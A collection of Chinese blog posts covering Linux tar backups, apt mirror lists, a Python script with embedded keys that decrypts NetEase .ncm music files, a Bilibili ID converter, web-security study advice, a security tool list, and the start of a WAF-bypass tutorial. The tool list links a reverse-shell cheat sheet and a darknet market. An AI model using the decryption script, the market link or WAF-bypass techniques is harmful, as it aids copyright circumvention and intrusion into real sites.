[{"content":"在 使用Ubuntu之前，相信很多人都有过使用Windows系统的经历。如果你备份过Windows系统，那么你一定记忆犹新：首先需要找到一个备份工 具(通常都是私有软件)，然后重启电脑进入备份工具提供的软件环境，在这里备份或者恢复Windows系统。Norton Ghost是备份Windows系统时经常使用的备份工具。\n在备份Windows系统的时候你可能想过，我能不能把整个C盘都放到一个ZIP文件里去呢。这在Windows下是不可能的，因为在Windows中有很多文件在它们运行时是不允许拷贝或覆盖的，因此你需要专门的备份工具对Windows系统进行特殊处理。\n和 备份Windows系统不同，如果你要备份Ubuntu系统(或者其它任何Linux系统)，你不再需要像Ghost这类备份工具。事实上，Ghost 这类备份工具对于Linux文件系统的支持很糟糕，例如一些Ghost版本只能完善地支持Ext2文件系统，如果你用它来备份Ext3文件系统，你可能会 丢失一些宝贵的数据。\n1. 备份系统 我该如何备份我的Ubuntu系统呢？很简单，就像你备份或压缩其它东西一样，使用TAR。和Windows不同，Linux不会限制root访问任何东西，你可以把分区上的所有东西都扔到一个TAR文件里去！\n首先成为root用户：\nsudo su 然后进入文件系统的根目录(当然，如果你不想备份整个文件系统，你也可以进入你想要备份的目录，包括远程目录或者移动硬盘上的目录)：\ncd / 下面是我用来备份系统的完整命令：\ntar cvpzf backup.tgz –exclude=/proc –exclude=/lost+found –exclude=/backup.tgz –exclude=/mnt –exclude=/sys / 让我们来简单看一下这个命令：\n“tar”当然就是我们备份系统所使用的程序了。\n“cvpfz”是tar的选项，意思是“创建档案文件”、“保持权限”(保留所有东西原来的权限)、“使用gzip来减小文件尺寸”。\n“backup.gz”是我们将要得到的档案文件的文件名。\n“/”是我们要备份的目录，在这里是整个文件系统。\n在 档案文件名“backup.gz”和要备份的目录名“/”之间给出了备份时必须排除在外的目录。有些目录是无用的，例如“/proc”、“/lost+ found”、“/sys”。当然，“backup.gz”这个档案文件本身必须排除在外，否则你可能会得到一些超出常理的结果。如果不把“/mnt”排 除在外，那么挂载在“/mnt”上的其它分区也会被备份。另外需要确认一下“/media”上没有挂载任何东西(例如光盘、移动硬盘)，如果有挂载东西， 必须把“/media”也排除在外。\n有人可能会建议你把“/dev”目录排除在外，但是我认为这样做很不妥，具体原因这里就不讨论了。\n执行备份命令之前请再确认一下你所键入的命令是不是你想要的。执行备份命令可能需要一段不短的时间。\n备份完成后，在文件系统的根目录将生成一个名为“backup.tgz”的文件，它的尺寸有可能非常大。现在你可以把它烧录到DVD上或者放到你认为安全的地方去。\n在备份命令结束时你可能会看到这样一个提示：’tar: Error exit delayed from previous errors’，多数情况下你可以忽略它。\n你还可以用Bzip2来压缩文件，Bzip2比gzip的压缩率高，但是速度慢一些。如果压缩率对你来说很重要，那么你应该使用Bzip2，用“j”代替命令中的“z”，并且给档案文件一个正确的扩展名“bz2”。完整的命令如下：\ntar cvpjf backup.tar.bz2 –exclude=/proc –exclude=/lost+found –exclude=/backup.tar.bz2 –exclude=/mnt –exclude=/sys / 2. 恢复系统 在进行恢复系统的操作时一定要小心！如果你不清楚自己在做什么，那么你有可能把重要的数据弄丢，请务必小心！\n接着上面的例子。切换到root用户，并把文件“backup.tgz”拷贝到分区的根目录下。\n在 Linux中有一件很美妙的事情，就是你可以在一个运行的系统中恢复系统，而不需要用boot-cd来专门引导。当然，如果你的系统已经挂掉不能启动了， 你可以用Live CD来启动，效果是一样的。你还可以用一个命令把Linux系统中的所有文件干掉，当然在这里我不打算给出这个命令！\n使用下面的命令来恢复系统：\ntar xvpfz backup.tgz -C / 如果你的档案文件是使用Bzip2压缩的，应该用：\ntar xvpfj backup.tar.bz2 -C / 注意：上面的命令会用档案文件中的文件覆盖分区上的所有文件。\n执行恢复命令之前请再确认一下你所键入的命令是不是你想要的，执行恢复命令可能需要一段不短的时间。\n恢复命令结束时，你的工作还没完成，别忘了重新创建那些在备份时被排除在外的目录：\nmkdir proc mkdir lost+found mkdir mnt mkdir sys 当你重启电脑，你会发现一切东西恢复到你创建备份时的样子了！\n","permalink":"https://examplesite.com/posts/20210601/","summary":"","title":"Linux系统备份与还原"},{"content":"打开配置文件 vim /etc/apt/sources.list kali源 #中科大 deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib #阿里云 deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib #清华大学 deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free #浙大 deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free #东软大学 deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib #官方源 deb http://http.kali.org/kali kali-rolling main non-free contrib deb-src http://http.kali.org/kali kali-rolling main non-free contrib debian源 # 中科大源 deb http://mirrors.ustc.edu.cn/debian buster main contrib non-free deb http://mirrors.ustc.edu.cn/debian buster-updates main contrib non-free deb http://mirrors.ustc.edu.cn/debian buster-backports main contrib non-free deb http://mirrors.ustc.edu.cn/debian-security/ buster/updates main contrib non-free #deb-src http://mirrors.ustc.edu.cn/debian buster main contrib non-free #deb-src http://mirrors.ustc.edu.cn/debian buster-updates main contrib non-free #deb-src http://mirrors.ustc.edu.cn/debian buster-backports main contrib non-free #deb-src http://mirrors.ustc.edu.cn/debian-security/ buster/updates main contrib non-free # 阿里云 deb http://mirrors.aliyun.com/debian/ buster main non-free contrib deb http://mirrors.aliyun.com/debian/ buster-updates main non-free contrib deb http://mirrors.aliyun.com/debian/ buster-backports main non-free contrib deb http://mirrors.aliyun.com/debian-security buster/updates main #deb-src http://mirrors.aliyun.com/debian/ buster main non-free contrib #deb-src http://mirrors.aliyun.com/debian/ buster-updates main non-free contrib #deb-src http://mirrors.aliyun.com/debian/ buster-backports main non-free contrib #deb-src http://mirrors.aliyun.com/debian-security buster/updates main # 网易源 deb http://mirrors.163.com/debian/ buster main non-free contrib deb http://mirrors.163.com/debian/ buster-updates main non-free contrib deb http://mirrors.163.com/debian/ buster-backports main non-free contrib deb http://mirrors.163.com/debian-security/ buster/updates main non-free contrib #deb-src http://mirrors.163.com/debian/ buster main non-free contrib #deb-src http://mirrors.163.com/debian/ buster-updates main non-free contrib #deb-src http://mirrors.163.com/debian/ buster-backports main non-free contrib #deb-src http://mirrors.163.com/debian-security/ buster/updates main non-free contrib # 官方源 deb http://deb.debian.org/debian buster main contrib non-free deb http://deb.debian.org/debian buster-updates main contrib non-free deb http://deb.debian.org/debian-security/ buster/updates main contrib non-free #deb-src http://deb.debian.org/debian buster main contrib non-free #deb-src http://deb.debian.org/debian buster-updates main contrib non-free #deb-src http://deb.debian.org/debian-security/ buster/updates main contrib non-free 更新软件列表并更新软件 sudo apt update \u0026amp;\u0026amp; sudo apt upgrade -y ","permalink":"https://examplesite.com/posts/20210501/","summary":"","title":"kali 修改为国内源"},{"content":" 网易云音乐把.mp3音乐文件加密为.ncm文件，导致不能将下载好的音乐复制到其它设备，或使用非网易云音乐播放器播放，该程序可将.ncm文件逆向解密为.mp3文件，并保留原始音质。\n # 依赖pycrypto库 import binascii import struct import base64 import json import os from Crypto.Cipher import AES def dump(file_path): core_key = binascii.a2b_hex(\u0026#34;687A4852416D736F356B496E62617857\u0026#34;) meta_key = binascii.a2b_hex(\u0026#34;2331346C6A6B5F215C5D2630553C2728\u0026#34;) unpad = lambda s : s[0:-(s[-1] if type(s[-1]) == int else ord(s[-1]))] f = open(file_path,\u0026#39;rb\u0026#39;) header = f.read(8) assert binascii.b2a_hex(header) == b\u0026#39;4354454e4644414d\u0026#39; f.seek(2, 1) key_length = f.read(4) key_length = struct.unpack(\u0026#39;\u0026lt;I\u0026#39;, bytes(key_length))[0] key_data = f.read(key_length) key_data_array = bytearray(key_data) for i in range (0,len(key_data_array)): key_data_array[i] ^= 0x64 key_data = bytes(key_data_array) cryptor = AES.new(core_key, AES.MODE_ECB) key_data = unpad(cryptor.decrypt(key_data))[17:] key_length = len(key_data) key_data = bytearray(key_data) key_box = bytearray(range(256)) c = 0 last_byte = 0 key_offset = 0 for i in range(256): swap = key_box[i] c = (swap + last_byte + key_data[key_offset]) \u0026amp; 0xff key_offset += 1 if key_offset \u0026gt;= key_length: key_offset = 0 key_box[i] = key_box[c] key_box[c] = swap last_byte = c meta_length = f.read(4) meta_length = struct.unpack(\u0026#39;\u0026lt;I\u0026#39;, bytes(meta_length))[0] meta_data = f.read(meta_length) meta_data_array = bytearray(meta_data) for i in range(0,len(meta_data_array)): meta_data_array[i] ^= 0x63 meta_data = bytes(meta_data_array) meta_data = base64.b64decode(meta_data[22:]) cryptor = AES.new(meta_key, AES.MODE_ECB) meta_data = unpad(cryptor.decrypt(meta_data)).decode(\u0026#39;utf-8\u0026#39;)[6:] meta_data = json.loads(meta_data) crc32 = f.read(4) crc32 = struct.unpack(\u0026#39;\u0026lt;I\u0026#39;, bytes(crc32))[0] f.seek(5, 1) image_size = f.read(4) image_size = struct.unpack(\u0026#39;\u0026lt;I\u0026#39;, bytes(image_size))[0] image_data = f.read(image_size) file_name = meta_data[\u0026#39;musicName\u0026#39;] + \u0026#39;.\u0026#39; + meta_data[\u0026#39;format\u0026#39;] m = open(os.path.join(os.path.split(file_path)[0],file_name),\u0026#39;wb\u0026#39;) chunk = bytearray() while True: chunk = bytearray(f.read(0x8000)) chunk_length = len(chunk) if not chunk: break for i in range(1,chunk_length+1): j = i \u0026amp; 0xff; chunk[i-1] ^= key_box[(key_box[j] + key_box[(key_box[j] + j) \u0026amp; 0xff]) \u0026amp; 0xff] m.write(chunk) m.close() f.close() if __name__ == \u0026#39;__main__\u0026#39;: import sys if len(sys.argv) \u0026gt; 1: for file_path in sys.argv[1:]: try: dump(file_path) except: pass else: print(\u0026#34;Usage: python ncmdump.py \\\u0026#34;File Name\\\u0026#34;\u0026#34;) ","permalink":"https://examplesite.com/posts/20210401/","summary":"","title":"论如何使用Python解密ncm文件"},{"content":"AV号BV号互相转换脚本 class Bilibili { protected $tr = \u0026#34;fZodR9XQDSUm21yCkr6zBqiveYah8bt4xsWpHnJE7jL5VG3guMTKNPAwcF\u0026#34;; protected $xor = 177451812; protected $add = 8728348608; protected $s = [11, 10, 3, 8, 4, 6]; // BV 转 AV  public function dec($bv) { $r = 0; $tr = array_flip(str_split($this-\u0026gt;tr)); for ($i = 0; $i \u0026lt; 6; $i++) { $r += $tr[$bv[$this-\u0026gt;s[$i]]] * (pow(58, $i)); } return ($r - $this-\u0026gt;add) ^ $this-\u0026gt;xor; } // AV 转 BV  public function enc($av) { $tr = str_split($this-\u0026gt;tr); $bv = \u0026#39;BV1 4 1 7 \u0026#39;; $av = ($av ^ $this-\u0026gt;xor) + $this-\u0026gt;add; for ($i = 0; $i \u0026lt; 6; $i++) { $bv[$this-\u0026gt;s[$i]] = $tr[floor($av/pow(58,$i)%58)]; } return $bv; } } // 调用 $str = new Bilibili(); echo $str-\u0026gt;dec(\u0026#39;BV17x411w7KC\u0026#39;); // 输出: 170001 echo $str-\u0026gt;enc(170001); // 输出: BV17x411w7KC table=\u0026#39;fZodR9XQDSUm21yCkr6zBqiveYah8bt4xsWpHnJE7jL5VG3guMTKNPAwcF\u0026#39; tr={} for i in range(58): tr[table[i]]=i s=[11,10,3,8,4,6] xor=177451812 add=8728348608 def dec(x): r=0 for i in range(6): r+=tr[x[s[i]]]*58**i return (r-add)^xor def enc(x): x=(x^xor)+add r=list(\u0026#39;BV1 4 1 7 \u0026#39;) for i in range(6): r[s[i]]=table[x//58**i%58] return \u0026#39;\u0026#39;.join(r) print(dec(\u0026#39;BV17x411w7KC\u0026#39;)) print(dec(\u0026#39;BV1Q541167Qg\u0026#39;)) print(dec(\u0026#39;BV1mK4y1C7Bz\u0026#39;)) print(enc(170001)) print(enc(455017605)) print(enc(882584971)) ","permalink":"https://examplesite.com/posts/20210301/","summary":"","title":"Bilibili AV号BV号互相转换脚本"},{"content":"表弟大一刚结束，学的是计算机相关的专业，上学期开始学安全相关的技术，我就给他买了一套云课堂的 《Web安全工程师微专业》 课程，结果这货学到第一课的时候，因为错过章节考试时间直接没及格\u0026hellip;\u0026hellip;好在后边几课都按部就班的学习了，然后应该是6月份开始试着在 教育行业SRC 挖掘漏洞，到现在也只是发现了几个XSS、敏感文件泄露之类的小漏洞，和他同期学习课程的一些同学已经挖了很多了排名很靠前，还有在企业SRC挖洞的，看看别人家的表弟\u0026hellip;之前表弟要准备课程的期末考试之类的，现在放暑假了，我就建议说可以再好好学习那套课程，趁着暑假，多实践。然后就讨论到 有没有适合入门阶段学习的Web安全书籍 这个问题。\n说到Web安全书籍，这几年其实是一种百家齐放的状态，不断有优秀的书籍出版，那这里就尽可能少地整理几本我阅读过的Web安全入门书籍作为推荐。\n如果没学过相关课程的小伙伴，真的从0基础开始的话，还是需要先掌握一些基本的技能：\n 学习 网站构建初级教程_W3C 以及 HTTP协议基础-runoob 上了解Web前后端以及HTTP协议的一些基础介绍，花半天时间对相关技术有个概念性的了解就够了。 Windows下下载 phpStudy 或者 WAMP ，在本地搭建Web服务器环境，然后自己搜索两篇文章学习下基本的操作方法。这个本地Web服务器也就相当于学习过程中的一个实验环境了。 学习浏览器的开发者工具（通常快捷键F12调出），搜索一些教学文章，掌握Chrome或者Firefox浏览器开发者工具中的Network、Elements功能的常见用法，可以查看HTTP数据包以及定位页面元素。  0x01 给表弟的Web安全入门建议 适合初学者的Web安全书籍  《白帽子讲Web安全》 道哥出品，很多人的Web安全启蒙书。 《Web前端黑客技术揭秘》 前端黑客技术，余弦的作品。  对于读书，我觉得读书的目的是：学以致用。应该把注意力放在如何应用读到的知识，提高自己的技术，而不是学了多少内容。 一年哪怕只学习了一本书，也要让这本书的内容结结实实地提升自己的技能，而不是只为了多一点谈资或者阅读清单上多一个数目。这也是我这里只推荐了两本书的原因，因为我觉得这两本书，能够认真学习完，并且实践书中的案例和技能，已经很难得了，同时相比于简单翻一遍，要多花费很多的时间和精力。\n工具与实战 那学习Web安全呢，同时还要掌握一些工具：浏览器开发者工具与浏览器插件（如HackBar、ProxySwitcher）、抓包工具如Burpsuite、漏洞扫描和验证工具如御剑、sqlmap、AWVS，工具可以在 Freebuf上自行搜索下载，教程可以参考Web安全-i春秋系列教程中对应这几款工具的章节学习。\n好的工具可以帮助我们提高测试效率，扩展测试思路。除了工具的使用，通过搭建本地实战环境练习手工技巧，也是很好的进阶之路，这里建议可以搭建 DVWA漏洞测试环境，然后参考 DVWA系列教程_Freebuf进行学习。\n学习的同时也可以在在教育行业SRC等漏洞平台上挖掘漏洞，赢得认可，也是一种动力，但挖掘漏洞的时候一定要注意规范和界限，可以参考自律方能自由，《网络安全法》实施后的白帽子行为参考，挖掘漏洞的同时也要注意保护自己。\n适合初学者的社区和资讯站点   网站安全_i春秋社区 i春秋社区聚集了很多的人气，有好多学生，也很活跃，入门和进阶的文章都有，可以多多交流。\n  Freebuf 很多科普和梳理性的文章，也经常会有时下的热点讨论。\n大学在校生可以关注的一些比赛   全国大学生信息安全竞赛 这个和全国大学生电子设计竞赛信息安全技术专题邀请赛一样，都是做一个安全软硬件系统来解决一些安全问题，通常有项目文档提交、源代码提交、现场演示答辩等几个步骤，分为初赛复赛，全国大学生信息安全竞赛为每年一次，全国大学生电子设计竞赛信息安全技术专题邀请赛通常两年一次，这两个比赛获奖对于大学生都有竞赛加分，在锻炼自己的同时，对评奖学金和保研也有帮助。\n  全国大学生信息安全竞赛创新实践能力线上赛（CTF形式） 这个是和i春秋合作的线上赛，和线下赛目前看来还没什么关联，CTF性质的。每年的CTF比赛很多，大家可以关注i春秋等一些站点的资讯就行了，大学生组队参加CTF比赛的挺多，也是很好的锻炼方式。\n  挖洞、博客与团队 既然是入门了，建议就可以随着学习的深入，在一些SRC平台上挖掘漏洞，如果你不太喜欢走这个路线，也可以整理自己的学习过程，写一些技术博客进行分享，俗话说来“你挖洞来我拍砖”，都可以，而且一些平台如Freebuf、先知社区都有付费文章奖励计划，这两种都可以在学习技术的同时获取到一些物质上的奖励，如果你慢慢有了一些编程能力（Python、Web前后端等），除了让自己的安全技术自动化之外，还可以再Github等平台分享一些开源项目。相关的SRC站点我随后再说。 关于写博客，如果自己搭建站点的话，可以考虑使用hexo+github搭建免费个人博客，或者租用一台VPS部署Wordpress博客程序。其实我觉得，初学的话，可以不在站点搭建上浪费时间，在一些比较优质的博客平台上注册一个帐号即可，也可以有自己的个性域名。如oschina、博客园、简书。写博客本身就是对自己知识技能的巩固和梳理，不要怕写不好，博客就当是给自己看的。 有一个点要提示一下，既然想走安全这条路，那么给自己想一个个性的ID（昵称），提交漏洞或者注册博客时都用这个，好好维护，当做自己的个人品牌认真经营，随着你的贡献和分享越来越多，你的ID会被越来越多的人了解和认可。 积累的过程中，如果恰好遇到几个志同道合的小伙伴，那就组个小团队吧，平时技术切磋交流，或者组团挖洞，打CTF等都是极好的。也可以主动去搜寻，或者申请加入一些公开招新的安全团队。一个人有时候可以走的更快，但一个团队往往可以走的更远。\n一些进阶的书籍和资源推荐 这部分内容按需选择即可，等你入门了之后，有了一定的技术和经验，你已经足够去规划自己的发展了。\n 《HTTP权威指南》 平时可以当做词典来翻阅。 《黑客攻防技术宝典 Web实战篇》 深入剖析Web安全技术。 《黑客秘笈 渗透测试实用指南》 可以在虚拟机VMware中，下载运行kali Linux的VM版本进行学习和实践。  编程技术相关的书籍和教程，W3C、菜鸟教程runoob 和现代魔法学院已经能解决很多问题了，然后语言相关的官方文档都可以当做词典来查，如果想找本书系统学习的话，这里推荐下Python、PHP和Web前端的书。 《Python核心编程》 《PHP和MySQL Web开发》 《Head First HTML与CSS》 《JavaScript高级程序设计》\n站点可以浏览下 安全圈info 与 SecWiki ，前者是一个持续更新的安全圈站点导航，总能找到你想要的网站，之前说的SRC站点这里都有，后者是一个安全资讯的收录分享平台，有什么安全问题可以搜索一些历史文章看看。\n0x02 聊聊“学习”与“实践” 入门与进阶 对于初学者来说，找一个靠谱的教程或者老师，帮助自己快速入门是非常有必要的。入门之后，虽然高手的点拨也很重要，但更多的功课其实是需要你自己来做的。这也是为什么优秀的入门教程很多，但是优质的进阶版本教程却不多。 有一句话叫“付费就是占便宜”，对于新手来说，入门阶段花一点钱买一套优质的课程，让有经验的内行带着自己学习，往往是最优的选择。还有一句话叫“免费的就是最贵的”，免费的教学资源，质量参差不齐难以保证，不用花钱，但耗费的是你筛选的精力和时间。自己根据条件取舍，现在已经逐渐进入了一种知识付费的时代，这就是我给表弟买了一套云课堂的《Web安全工程师微专业》课程作为入门学习的原因，一套优质的网课，相比于昂贵的线下班性价比很不错。\n等准备好了再“实践”？ 李笑来老师有一个观点，学习任何一个学科的时候，都有一个概念很重要：\n 最少必要知识 MAKE : Minimal Actionable Knowledge and Experience\n 就是说，当我们在学习某项技能的时候，就要用最快的时间摸索清楚最少必要知识 （MAKE） 都有哪些？ 然后迅速地掌握它们，这样就实现了“快速入门”，然后就可以开始动手实践，然后在实践中印证理论、加深理解，同时继续扩展学习。 同样的时间，一个用来等待，另一个用来践行，两者的差距可能是天壤之别。你要知道没有任何考试是在你准备充分了才开始的。 有些人喜欢等待，等到合适的时机出现的时候，再采取行动。另一些人则喜欢边做边想，有不足的地方就改进，有新的问题就解决。 一段时间过去之后，后者可能已经前进了很长一段路程，而前者多半还在等待一个“恰当的时机”。 我原来就有这个问题，老想着先体系化学完某门技术\u0026hellip;结果就是坚持不实践，过了很久还是啥都不会，反而之前看的那些知识因为没实践过也都忘了。 用和学，用比学重要。用时比学时重要。“用时”是一个很好的概念。 很多人说自己“学”了那么多年英语，但现在依然说不出，听不懂。其实他们就是在用“学时”代替“用时”来计算自己的付出的。 我们总说有效学习，其实衡量有效学习最好的方式就是：计算使用的时间。在安全技术学习上，就是：实践的时间。\n从“想到”、“学到” 到 “做到” “用”比“学”重要；“做”比“想”重要；边做边想，比单纯想想不知道好多少倍。只有做到了才是掌握了。“人至‘践’则无敌”。 只要你开始做，高估或低估的困难就不仅仅是一个估计，而是一个摆在面前需要解决的现实问题。你对于它的理解不会再飘忽不定，而会变得非常具体。 很多人在做得不好的时候，总是喜欢退缩回原来的舒适区，认为是由于自己的基础还不好所以才这么不顺利，而忘记了这些践行过程中的困难，才是真正帮他们打牢基础的过程。\n0x03 结语 很多人梦想找到一个牛逼的师父，几天速成然后笑傲江湖。可是每一个真正练就一身武艺的人都是靠冬练三九夏练三伏这么过来的，他们靠着一种忘我的热情持续投入进去磨练，数年如一日，最终自己也不知道怎么就发现具备了无坚不摧的实力。 同样，就算是要开好挖掘机，或着当一个好厨师，也要在自己的技能树上，一步一步地积累技能点，把过路点都点满了，才能点出大招。 我们从小到大往往会听到长辈们的建议：“戒骄戒躁”。虽然“戒骄”放在前面，但“戒骄”其实是有了一定成绩之后的事情。对大多数人来说，首先要“戒躁”，才有机会“戒骄”。\n一个人能获得的最可贵的能力，都和掌握一门语言一样，你所付出的努力不是能够获得即时回馈的，甚至在很长的一段时间内没有任何收获，直到积累到了一定的阶段后，忽然爆发出惊人的力量，连你自己都不清楚这一切是如何发生的。比如锻炼身体，读书写作。当你经历了足够的量变终于引起质变时拥有的技能，大部分人是终身难以企及的，不是因为他们太笨，恰恰相反，因为他们都太聪明了。选择一个正确的方向，对那些无法立即获得回报的事情，依然能付出十年如一日的专注和热情，最终的结果也许不足以让你独孤求败，但足以出类拔萃。\n祝表弟早日成为表哥，然后带带我~\n本文相关链接资源整理：  《白帽子讲Web安全》 《Web前端黑客技术揭秘》 《HTTP权威指南》 《黑客攻防技术宝典 Web实战篇》 《黑客秘笈 渗透测试实用指南》 《Python核心编程》 《PHP和MySQL Web开发》 《Head First HTML与CSS》 《JavaScript高级程序设计》 W3C 菜鸟教程runoob 现代魔法学院 网站构建初级教程_W3C； HTTP协议基础-runoob； phpStudy ； WAMP； Freebuf； Web安全-i春秋； DVWA； DVWA系列教程_Freebuf； 教育行业SRC； 自律方能自由，《网络安全法》实施后的白帽子行为参考； 网站安全_i春秋社区； 全国大学生信息安全竞赛； 全国大学生信息安全竞赛创新实践能力线上赛（CTF形式）； oschina； 博客园； 简书； 安全圈info； SecWiki； 《Web安全工程师微专业》 《Web安全工程师微专业》进阶版 ","permalink":"https://examplesite.com/posts/20210201/","summary":"","title":"给表弟的Web安全入门建议"},{"content":"HTTP BurpSuite https://portswigger.net/burp/ 很多时候，免费版本已经满足需求 Fiddler http://www.telerik.com/fiddler Firefox Firebug NoScript Chrome F12 WhatWeb https://github.com/urbanadventurer/whatweb w3af https://github.com/andresriancho/w3af sqlmap https://github.com/sqlmapproject/sqlmap XSS\u0026rsquo;OR http://xssor.io/ 各种协议 端口扫描 Nmap https://nmap.org/ https://highon.coffee/blog/nmap-cheat-sheet/ Zmap https://www.zmap.io/ masscan https://github.com/robertdavidgraham/masscan https://github.com/offensive-security/masscan-web-ui Hydra https://www.thc.org/thc-hydra/ Metasploit https://www.metasploit.com/ https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers 流量 参见: 流量\nWireshark https://www.wireshark.org/ TShark https://www.wireshark.org/docs/man-pages/tshark.html Tcpdump http://www.tcpdump.org/ Snort https://www.snort.org/ Bro https://www.bro.org/ Moloch http://molo.ch/ Suricata https://suricata-ids.org/ 漏洞测试 漏洞环境 Metasploitable3 https://github.com/rapid7/metasploitable3 WebGoat https://github.com/WebGoat/WebGoat DVWA https://github.com/ethicalhack3r/DVWA XVWA https://github.com/s4n7h0/xvwa 网络空间搜索引擎 Google ZoomEye https://www.zoomeye.org/ Shodan https://www.shodan.io/ Censys https://censys.io/ 漏洞库 Exploit-DB https://www.exploit-db.com/ https://www.exploit-db.com/searchsploit/ Seebug https://www.seebug.org/ 0day.today http://0day.today/ 渗透测试 洛马七步杀 参见:假设自己正被“洛马七步杀\nhttp://www.lockheedmartin.com/us/what-we-do/aerospace-defense/cyber/cyber-kill-chain.html PenetrationTestingToolsCheatSheet https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/ 端口转发 最基础的SSH隧道 https://www.ibm.com/developerworks/cn/linux/l-cn-sshforward/index.html iptables-tnat https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/4/html/Security_Guide/s1-firewall-ipt-fwd.html rtcp.py https://github.com/knownsec/rtcp(https://github.com/knownsec/rtcp) 姿势大全 https://artkond.com/2017/03/23/pivoting-guide/ ReverseShellCheatSheet http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet 部分框架 KaliLinux http://tools.kali.org/tools-listing PentestBox https://pentestbox.org/ Maltego https://www.paterva.com/web7/ TheSocial-EngineerToolkit(SET) https://github.com/trustedsec/social-engineer-toolkit CobaltStrike https://www.cobaltstrike.com/ Nmap Metasploit BeEF http://beefproject.com/ mitmproxy https://mitmproxy.org/ 防御 暴力美学 不需要必须放线上的服务都下线 默认关闭所有端口，只开需要的 服务器登录只允许公私钥形式 干掉一切明文传输 使用口碑好的第三方服务及组件 备份备份再备份 假设自己正被“洛马七步杀” 参见:洛马七步杀\n部分工具 流量 参见:流量\nSecurityOnion https://securityonion.net/ OSSEC https://ossec.github.io/ Splunk https://www.splunk.com/ ELK Lynis https://cisofy.com/lynis/ iptables/防火墙 JWT https://jwt.io/ 资料 程序员与黑客系列 http://www.infoq.com/cn/presentations/programmers-and-hackers http://www.infoq.com/cn/presentations/programmers-and-hackers-part02 实用性开发人员安全须知 https://github.com/FallibleInc/security-guide-for-developers SaaS型初创企业安全101 https://github.com/forter/security-101-for-saas-startups 从脚本到大并发 JavaScript jQuery Bootstrap 前端框架，不仅JavaScript Node.js https://nodejs.org/ npm https://www.npmjs.com/ Python PEP8编程习惯 https://www.python.org/dev/peps/pep-0008/ urllib2 socket requests 框架 Scrapy 爬虫框架 Django Web开发框架 并发 thread/threading multiprocessing gevent pip https://pypi.python.org/pypi Go https://tour.go-zh.org/list 数据相关 bsddb SQLite MySQL MongoDB Cassandra ELK Elasticsearch Logstash Kibana Neo4j Redis Memcached Hadoop JSON XML cPickle protobuf 正则表达式 调试工具 Kodos RegexBuddy https://regexper.com/ 正则表达式30分钟入门教程 https://deerchao.net/tutorials/regex/regex.htm Python http://wiki.ubuntu.org.cn/Python正则表达式操作指南 高效习惯 VIM 简明VIM练级攻略 http://coolshell.cn/articles/5426.html Markdown Git https://try.github.io/ FreeMind/XMind yEd Evernote Windows Putty https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html WinSCP SysinternalsSuite Mac iTerm2 http://www.iterm2.com/ Homebrew https://brew.sh/ Linux Bash https://github.com/jlevy/the-art-of-command-line https://github.com/Idnan/bash-guide tmux/screen/grep/zgrep/awk/sed/cut/find/du/df/dd/ls/cat/cd/pwd/id/free/ps/netstat/vmstat/top/crontab/tree/tail/head/vi/ifconfig/lsof/dig/mount/strings/uname/echo/history/tar/unzip/gzip/zip/diff/md5sum/file/base64/rm/mv/gcc/kill/chown/chmod/last/whoami/strace/ltrace/iptables/nohup/nc/scp/ssh/telnet 隔离 VMware VirtualBox ParallelsDesktop Docker 翻墙 https://github.com/shadowsocks proxychains 暗网 https://alphabaymarket.com/ 硬件 iPhone+iPad+Mac ThinkPad 云服务 VPS AWS Linode Vultr DigitalOcean Dropbox OneDrive GoogleDocs Email Gmail Outlook ProtonMail 安全 GPG https://gnupg.org/download/index.html TrueCrypt 情报跟进 Inoreader Twitter 说明 V1By@余弦201709 联系我：evilcos@gmail.com 更新动态关注微信公众号：懒人在思考 工欲善其事必先利其器 世界之大总有一款利器适合你 https://github.com/Hack-with-Github/Awesome-Hacking 特别说明 这份技能树最适合走向安全工程化之路的人 这份技能树以利器为主要出发点进行梳理 应该叫“余弦的安全技能树简版”更合适","permalink":"https://examplesite.com/posts/20210101/","summary":"","title":"安全技能书简版"},{"content":"攻击的特定: 攻击二象性:已知攻击和未知攻击\n目前市面主流的WAF产品: 云WAF  阿里云盾 腾讯网站管家 创宇盾 ClodeFlare等  软件产品类  安全狗 云锁 360主机卫士 ModSecurity  硬件类型设备:  启明星辰 绿盟 天融信 飞塔等  硬件waf缺陷:对HTTP协议的兼容性不强,对异常报文会产生bug,导致绕过\nWAF的核心原理:  运用黑白思想 特征匹配,漏洞签名:特定特征的漏洞,比如stract2漏洞 对匹配结果进行响应(拦截,记录)  WAF的几种部署模式: 基于DNS解析 修改DNS,让域名解析到反向代理服务器,所有流量经过反向代理进行检测,检测无问题之后再转发给后端的web服务器 串联模式 一般指的是反向代理模式,透明代理模式.反向代理模式会改变原有的网络拓扑,真实客户端ip会以HTTP header传递给后端web server.透明代理模式可以在不改变原有网络拓扑结构的情况下直接部署. 旁路模式 利用流量镜像技术,将业务流量分流给WAF产品,这种部署模式的优点是不会影响业务稳定性,所以WAF会投入更多的性能在检出率上面.但是缺点也很明显,不借助其他手段无法对检测出的攻击行为进行阻断. 软件嵌入中间件+检测引擎模式 在使用nginx作为反向代理的业务中,WAF提高nginx模块嵌入原有nginx,将请求转发给检测引擎,可以做到在不改动原有的网络拓扑的情况下完成检测任务 WAF为什么会被绕过:  鱼(安全)和熊掌(业务性能)不能兼得,waf需要满足基本业务需求,所以一般不设置白名单之类的过于苛刻的操作 WAF为了考虑通用性的问题,无法100%覆盖某些语言,中间件,数据库等特性 硬件WAF自身往往存在漏洞    架构:waf部署模式 规则缺陷/特性 协议:指HTTP0.9协议:TCP长连接  WAF绕过实战—-绕过安全狗进行注入 所谓的bypass waf实际上是去寻找位于waf设备之后处理应用层数据包的硬件/软件的特性,利用特性构造waf不能命中,但是在应用程序能够执行成功的payload,绕过防护\n实验环境: 环境:安全狗Apache最新版 